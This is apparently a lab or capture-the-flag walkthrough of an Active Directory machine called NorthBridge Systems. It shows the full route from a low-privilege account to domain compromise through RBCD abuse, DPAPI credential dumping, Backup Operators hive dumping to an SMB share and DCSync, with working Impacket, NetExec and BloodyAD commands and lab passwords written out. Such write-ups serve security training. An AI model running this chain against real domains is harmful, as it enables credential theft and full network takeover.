# NorthBridge Systems (Hard)

Starting Creds:

`_securitytestingsvc:4kCc$A@NZvNAdK@`

# ATTACK CHAIN :

1. SMBShare READ and RDP as _securitytestingsvc (NORTHJMP01)

1. _svrautomationsvc credentials (found in /scripts)

1. _svrautomationsvc MachineQuotaAccount 10 on specific OU (found in /scripts)

1. Adding New Machine Domain Joined.  (Bloodyad)

1. RBCD Attack (Resource Based Constrained Delegation

1. Rooting NORTHJMP01 through Impersonation of user “smccormickT1” (member of NorthJMP01Priv (in local Administrators). The other users domain level are “Sensitive” == no delegation possible)

1. Impacket-secretsdump of NORTHJMP01 (Administrator Hash)

1. DPAPI creds of user _backupsvc dumping (netExec --dpapi | Found in /scripts)

1. Backup Operator exploit on NORTHDC01 (_backupsvc — impacket-reg | nxc smb -M backup_operator | NORTHDC01$ credentials dumping)

1. Rooting DC01 through DCSYNC = with NORTHDC01$ credentials (impacket-secretsdump -just-dc-user Administrator (which is local and not “Sensitive”)

# ENUMERATION

## NORTHDC01

![northbridge-systems screenshot 1](images/northbridge-systems/northbridge-systems-01.png)

![northbridge-systems screenshot 2](images/northbridge-systems/northbridge-systems-02.png)

![northbridge-systems screenshot 3](images/northbridge-systems/northbridge-systems-03.png)

Double check shares:

![northbridge-systems screenshot 4](images/northbridge-systems/northbridge-systems-04.png)

Checking SYSVOL:

![northbridge-systems screenshot 5](images/northbridge-systems/northbridge-systems-05.png)

What is that?

![northbridge-systems screenshot 6](images/northbridge-systems/northbridge-systems-06.png)

Mh, let’s keep it in mind.

## BLOODHOUND ENUM

Bloodhound?

- Bloodhound-ce-python

![northbridge-systems screenshot 7](images/northbridge-systems/northbridge-systems-07.png)

Let’ analyze it :

![northbridge-systems screenshot 8](images/northbridge-systems/northbridge-systems-08.png)

No outbound Object control.

Kerberoasting?

![northbridge-systems screenshot 9](images/northbridge-systems/northbridge-systems-09.png)

Asrep roasting?

![northbridge-systems screenshot 10](images/northbridge-systems/northbridge-systems-10.png)

## Users enum
## :

![northbridge-systems screenshot 11](images/northbridge-systems/northbridge-systems-11.png)

We make a list.

RDP and WINRM = Failed.

_________________

## NORTHJMP01

![northbridge-systems screenshot 12](images/northbridge-systems/northbridge-systems-12.png)

Shares?

![northbridge-systems screenshot 13](images/northbridge-systems/northbridge-systems-13.png)

/Network Shares?

![northbridge-systems screenshot 14](images/northbridge-systems/northbridge-systems-14.png)

In /archive/backup.bat we got some creds:

![northbridge-systems screenshot 15](images/northbridge-systems/northbridge-systems-15.png)

`_backupautomation : 1rUlHB95TVA2I&BCve`

/security/PingCastle

![northbridge-systems screenshot 16](images/northbridge-systems/northbridge-systems-16.png)

Interesting the config files and pdfs:

The first PDF is a Self Assessment AD

![northbridge-systems screenshot 17](images/northbridge-systems/northbridge-systems-17.png)

The second one is a Ping Castle Manual.

![northbridge-systems screenshot 18](images/northbridge-systems/northbridge-systems-18.png)

In /security/sm :

![northbridge-systems screenshot 19](images/northbridge-systems/northbridge-systems-19.png)

https://specterops.io/blog/2021/06/17/certified-pre-owned/#7271

/service Desk

![northbridge-systems screenshot 20](images/northbridge-systems/northbridge-systems-20.png)

![northbridge-systems screenshot 21](images/northbridge-systems/northbridge-systems-21.png)

![northbridge-systems screenshot 22](images/northbridge-systems/northbridge-systems-22.png)

We got a temporary password for password reset :

`ChangeMe@Northbridge!!`

And

`NewP@ssword123  >??`

/Wintel Engineering

![northbridge-systems screenshot 23](images/northbridge-systems/northbridge-systems-23.png)

In terms of credentials, till now we got 3 different kind of passwords :

`1rUlHB95TVA2I&BCve`

`ChangeMe@Northbridge!!`

`NewP@ssword123`

Can we try to spry them on users we have?

Maybe one of the users have reset their password without changing it yet

- Crackmapexec

![northbridge-systems screenshot 24](images/northbridge-systems/northbridge-systems-24.png)

Not for ChangeMe@Northbridge!!

![northbridge-systems screenshot 25](images/northbridge-systems/northbridge-systems-25.png)

Not for NewP@ssword123

![northbridge-systems screenshot 26](images/northbridge-systems/northbridge-systems-26.png)

Not for 1rUlHB95TVA2I&BCve

## RDP ACCESS AS _SECURITYTESTNGSVC

Can we RDP?

![northbridge-systems screenshot 27](images/northbridge-systems/northbridge-systems-27.png)

We’re in.

## ENUMERATION

- Tree /f

![northbridge-systems screenshot 28](images/northbridge-systems/northbridge-systems-28.png)

- whoami /all

![northbridge-systems screenshot 29](images/northbridge-systems/northbridge-systems-29.png)

- C:/

![northbridge-systems screenshot 30](images/northbridge-systems/northbridge-systems-30.png)

/scripts/AD Domain Backup seems interesting.

![northbridge-systems screenshot 31](images/northbridge-systems/northbridge-systems-31.png)

We got an hardcoded password

And we know that the password has been converted in secured string using powershell.

Do we know a way of restoring the password in cleartext?

![northbridge-systems screenshot 32](images/northbridge-systems/northbridge-systems-32.png)

# ACCESS AS _SVRAUTOMATIONSVC

/Server Build Automation

![northbridge-systems screenshot 33](images/northbridge-systems/northbridge-systems-33.png)

We got credentials :

`_svrautomationsvc :  yf0@EoWY4cXqmVv`

Let’s try it out with:

- Nxc smb

![northbridge-systems screenshot 34](images/northbridge-systems/northbridge-systems-34.png)

![northbridge-systems screenshot 35](images/northbridge-systems/northbridge-systems-35.png)

_svrautomationsvc has WriteAccountRestrictions on NORTHJUMP01.

What is it and how can we abuse it?

![northbridge-systems screenshot 36](images/northbridge-systems/northbridge-systems-36.png)

Seems that we can add a computer account, delegate and pretend to be admin.

## ADDING NEW COMPUTER DOMAIN JOINED

Let’s try it out :

1. Add computer :

1. Impacket-addcomputer

`impacket-addcomputer -method LDAPS -computer-name "ZULEMA$" -computer-pass "zulema123\!" northbridge.corp/_svrautomationsvc:"yf0@EoWY4cXqmVv" -domain-netbios northbridge.corp -dc-host NORTHDC01.NORTHBRIDGE.CORP`

![northbridge-systems screenshot 37](images/northbridge-systems/northbridge-systems-37.png)

Machine quota exceeded.

Let’s check MachineQuota with :

- Nxc ldap -M maq

![northbridge-systems screenshot 38](images/northbridge-systems/northbridge-systems-38.png)

Bugging.

- BloodyAD:

`bloodyad -d northbridge.corp -u _svrautomationsvc -p "yf0@EoWY4cXqmVv" --host 10.1.46.251 get object 'DC=northbridge,DC=corp' --attr ms-DS-MachineAccountQuota`

![northbridge-systems screenshot 39](images/northbridge-systems/northbridge-systems-39.png)

MaQ 0.

Previously, we read in the file in the share /security/sm :

![northbridge-systems screenshot 40](images/northbridge-systems/northbridge-systems-40.png)

Set MAQ from 10 to 0.

This has been done.

We cannot add a machine then.

Let’s try to rdp with the user _svrautomationsvc

![northbridge-systems screenshot 41](images/northbridge-systems/northbridge-systems-41.png)

What if we run PingCastle to see what we can find ?

![northbridge-systems screenshot 42](images/northbridge-systems/northbridge-systems-42.png)

We cannot write in this dir.

If we create a /temp ?

- We transfer the zip file

- We unzip it :

- Expand-Archive <file-zip>

- ReRun PingCastle :

-
![northbridge-systems screenshot 43](images/northbridge-systems/northbridge-systems-43.png)

Done.

Let’s check the report html with Edge:

![northbridge-systems screenshot 44](images/northbridge-systems/northbridge-systems-44.png)

Well, I can’t find something useful

Let’s enumerate again.

Reviewing /Scripts :

![northbridge-systems screenshot 45](images/northbridge-systems/northbridge-systems-45.png)

`Password.txt contain a DPAPI-encrypted blob generated with : `

`“ConvertFrom-SecureString”, which is bound to the user and the system that created it. `

`It can only be decrypted within the appropriate DPAPI context or by obtaining the corresponding DPAPI keys. `

Meaning that:

![northbridge-systems screenshot 46](images/northbridge-systems/northbridge-systems-46.png)

If we’re not in the context of _backupsvc, we cannot decrypt the password.

Trying to run the script :

![northbridge-systems screenshot 47](images/northbridge-systems/northbridge-systems-47.png)

Prompted with an invalid key.

Something interesting:

![northbridge-systems screenshot 48](images/northbridge-systems/northbridge-systems-48.png)

This script is used by an automated process via the task scheduler.

![northbridge-systems screenshot 49](images/northbridge-systems/northbridge-systems-49.png)

![northbridge-systems screenshot 50](images/northbridge-systems/northbridge-systems-50.png)

If we run the script, a new local admin will be created :

NorthBridgeAdmin : Admin!123

But we cannot.

![northbridge-systems screenshot 51](images/northbridge-systems/northbridge-systems-51.png)

_svrautomationsvc exceeded MaQ BUT this maybe can be bypassed if it’s done in the specific OU.

![northbridge-systems screenshot 52](images/northbridge-systems/northbridge-systems-52.png)

**The concerned OU is : ServerProvisioning **

Can we validate this?

- Impacket-dacledit

`impacket-dacledit 'northbridge/_securitytestingsvc:4kCc$A@NZvNAdK@' -dc-ip 10.1.46.251 -principal _svrautomationsvc -target-dn OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp -action read`

![northbridge-systems screenshot 53](images/northbridge-systems/northbridge-systems-53.png)

Access allowed.

Let’s try to add a machine again but in the context of the specified OU :

- Bloodyad add computer

![northbridge-systems screenshot 54](images/northbridge-systems/northbridge-systems-54.png)

`bloodyad -u _svrautomationsvc -p "yf0@EoWY4cXqmVv" --dc-ip 10.1.46.251 -d northbridge.corp add computer "ZULEMA" "zulema123?" --ou OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp`

![northbridge-systems screenshot 55](images/northbridge-systems/northbridge-systems-55.png)

Computer created!

Let’s check it :

![northbridge-systems screenshot 56](images/northbridge-systems/northbridge-systems-56.png)

Next step according to Bloodhound :

![northbridge-systems screenshot 57](images/northbridge-systems/northbridge-systems-57.png)

## RBCD ATTACK (Resource Based Constrained Delegation)

Let’s try it out :

- Impacket-rbcd

`impacket-rbcd -delegate-from 'ZULEMA$' -delegate-to 'NORTHJMP01$' -action 'write' 'northbridge.corp/_svrautomationsvc:yf0@EoWY4cXqmVv' -dc-ip 10.1.46.251`

![northbridge-systems screenshot 58](images/northbridge-systems/northbridge-systems-58.png)

Next :

![northbridge-systems screenshot 59](images/northbridge-systems/northbridge-systems-59.png)

We can get a Service Ticket for the service name we want to pretend to be admin (or whoever user)

- Impacket-getST

`impacket-getST -spn 'cifs/NORTHJMP01.northbridge.corp' -impersonate 'Administrator' 'northbridge.corp/ZULEMA$:zulema123?'`

![northbridge-systems screenshot 60](images/northbridge-systems/northbridge-systems-60.png)

This is because domain Administrator is part of Protected User, that cannot be impersonated.

They are marked as “sensitive and cannot be delegated”

We have to find a way to craft a ticket for a Local Administrator.

Let’s inspect groups :

![northbridge-systems screenshot 61](images/northbridge-systems/northbridge-systems-61.png)

NorthJMP01Priv

What kind of groups is it?

![northbridge-systems screenshot 62](images/northbridge-systems/northbridge-systems-62.png)

Used to grant local administrator access on NORTHJMP01

We can validate it checking localgroup Administrators :

![northbridge-systems screenshot 63](images/northbridge-systems/northbridge-systems-63.png)

NORTHJMP01PRIV is inside.

Users in the NORTHJMP01 group are:

- gcookT1

- mleeT1

- rhallT1

- smccormickT1

Let’s try to impersonate one of them :

![northbridge-systems screenshot 64](images/northbridge-systems/northbridge-systems-64.png)

We impersonated smccormickT1

Export ticket:

![northbridge-systems screenshot 65](images/northbridge-systems/northbridge-systems-65.png)

Since we do not have any kind of interactive access, what we can do ?

Adding _securitytestingsvc or _svrautomationsvc to Administrator localgroup

- Nxc smb -x

`nxc smb NORTHJMP01 -k --use-kcache -u smccormickT1 -d northbridge.corp -x "Net localgroup Administrators _securitytestingsvc@northbridge.corp /add" `

![northbridge-systems screenshot 66](images/northbridge-systems/northbridge-systems-66.png)

Trying with WMI:

![northbridge-systems screenshot 67](images/northbridge-systems/northbridge-systems-67.png)

Executed.

Let’s RDP :

![northbridge-systems screenshot 68](images/northbridge-systems/northbridge-systems-68.png)

# NORTHJMP01 PWNED

## SECRETSDUMP

From here, can we secretsdump or run mimikatz?

Secretsdump :

- Impacket-secretsdump

`impacket-secretsdump northbridge.corp/_securitytestingsvc@10.1.105.181 `

![northbridge-systems screenshot 69](images/northbridge-systems/northbridge-systems-69.png)

We got some hashes including Administrator

## DPAPI _BACKUPSVC PASSWORD EXTRACTION

As previously seen, _backupsvc has some DPAPI credentials stored.

Since we have Administrator privileges now, we can dump them:

Using:

- Nxc smb -M dpapi_hash

` nxc smb 10.1.105.181 -u _securitytestingsvc -p "4kCc\$A@NZvNAdK@" -M dpapi_hash `

![northbridge-systems screenshot 70](images/northbridge-systems/northbridge-systems-70.png)

Well, actually it dumped just master keys.

Let’s use :

- NetExec smb --dpapi

`netexec smb northjmp01 -u _securitytestingsvc -p "4kCc\$A@NZvNAdK@" --dpapi`

![northbridge-systems screenshot 71](images/northbridge-systems/northbridge-systems-71.png)

We got cleartext password of

`_backupsvc : j0$QyPZ0JWzN2*iu^5`

## BACKUP OPERATORS EXPLOIT DC01

![northbridge-systems screenshot 72](images/northbridge-systems/northbridge-systems-72.png)

Backupsvc is member of BackupOperators meaning that we can read SAM and SYSTEM.

We can dump it remotely with :

- Impacket-reg

1. Run an smbserver

1. Impacket-smbserver

![northbridge-systems screenshot 73](images/northbridge-systems/northbridge-systems-73.png)

1. Run reg :

`impacket-reg northbridge.corp/_backupsvc:"j0\$QyPZ0JWzN2*iu^5"@northdc01 backup -o //10.200.75.57/hello`

![northbridge-systems screenshot 74](images/northbridge-systems/northbridge-systems-74.png)

SAM has been saved.

But not SYSTEM.

Something’s wrong

How can we save it?

![northbridge-systems screenshot 75](images/northbridge-systems/northbridge-systems-75.png)

Let’s try :

![northbridge-systems screenshot 76](images/northbridge-systems/northbridge-systems-76.png)

I don’t know why it’s not working

Let’s change tool and use :

- Nxc smb -M backup_operator

`nxc smb northdc01 -u _backupsvc -p "j0\$QyPZ0JWzN2*iu^5" -M backup_operator`

![northbridge-systems screenshot 77](images/northbridge-systems/northbridge-systems-77.png)

Done

We have :

- SAM

- SYSTEM

- SECURITY

- NTDS

(Even if the tool dumped all the hashes already, we will run impacket-secretsdump btw)

Now we can dump it running :

- Impacket-secrestdump LOCAL  -sam -system -security -ntds

![northbridge-systems screenshot 78](images/northbridge-systems/northbridge-systems-78.png)

We have dumped the $MACHINE.ACC hash that is the NORTHDC01$ hash.

Let’s check it with crakcmapexec

![northbridge-systems screenshot 79](images/northbridge-systems/northbridge-systems-79.png)

# FULL DOMAIN COMPROMISE — DCSYNC

The NORTHDC01$ machine account can perform a DCSync attack because Domain Controllers have replication privileges by default, allowing them to request password hashes from Active Directory.

Although DCSync can also retrieve the NTLM hash of users marked as Protected, it cannot be used for Pass-the-Hash or other NTLM-based lateral movement because the account belongs to the **Protected Users** group, which disables NTLM authentication.

Instead, we used the built-in **Administrator (RID 500)** account, whose NTLM hash remains usable since the **“Account is sensitive and cannot be delegated”** setting only restricts Kerberos delegation, not NTLM authentication.

For requesting DCSync user, we’re gonna use :

- Impacket-secretsdump -just-dc-user Administrator

![northbridge-systems screenshot 80](images/northbridge-systems/northbridge-systems-80.png)

![northbridge-systems screenshot 81](images/northbridge-systems/northbridge-systems-81.png)

![northbridge-systems screenshot 82](images/northbridge-systems/northbridge-systems-82.png)

# NORTHDC01 PWNED
